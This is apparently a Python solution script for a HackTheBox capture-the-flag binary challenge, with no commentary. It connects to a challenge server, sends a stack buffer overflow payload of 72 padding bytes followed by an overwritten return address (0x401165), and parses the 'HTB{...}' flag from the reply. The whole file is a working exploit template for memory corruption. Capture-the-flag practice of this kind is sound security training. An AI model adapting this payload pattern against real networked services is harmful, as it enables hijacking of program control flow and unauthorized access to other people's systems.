import socket
import readline

host = '127.0.0.1'
port = 9000
host = '159.65.52.165'
port = 31688

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  # print(f'[<] {info if info else ""}')
  # print(res)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()


padding = b'A'*72
target  = 0x401165

payload  = padding
payload += target.to_bytes(8, 'little')

data = b''
while b'>' not in data:
	data = recv()
send(b'1')

print('[*] Sending the payload...')
data = b''
while b'>' not in data:
	data = recv()
send(payload)

print('[*] Receiving the flag...')
flag = b''
while b'}' not in flag:
	flag += recv()
flag = flag[flag.find(b'HTB{'):flag.find(b'}')+1].decode('ascii')

print(f'Flag: {flag}')
